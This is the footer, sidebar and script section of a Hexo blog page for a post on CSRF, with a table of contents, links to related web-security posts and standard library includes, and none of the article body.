+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/04/16/Upload/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesx5fdwj20zk0m81kx.jpg" title="File upload">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> web安全</span>
+  <h3>File upload</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/10/16/hello-world/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeybxm1pj20zk0m8niv.jpg" title="Hello World">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>Hello World</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf"><span class="toc-number">1.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> CSRF 类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa"><span class="toc-number">1.2.</span> <span class="toc-text"> dvwa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf-tester"><span class="toc-number">1.3.</span> <span class="toc-text"> CSRF tester</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text"> CSRF 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-csrf"><span class="toc-number">1.5.</span> <span class="toc-text"> xss + csrf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss-csrf"><span class="toc-number">1.5.0.1.</span> <span class="toc-text"> stored xss + csrf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#self-xss-csrf"><span class="toc-number">1.5.0.2.</span> <span class="toc-text"> self-xss + csrf</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li class="active"><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">8</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">3</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/04/16/Upload/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/10/16/hello-world/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
+</div>
+
+    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/16/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
+</div>
+
+    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/05/27/CSRF/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
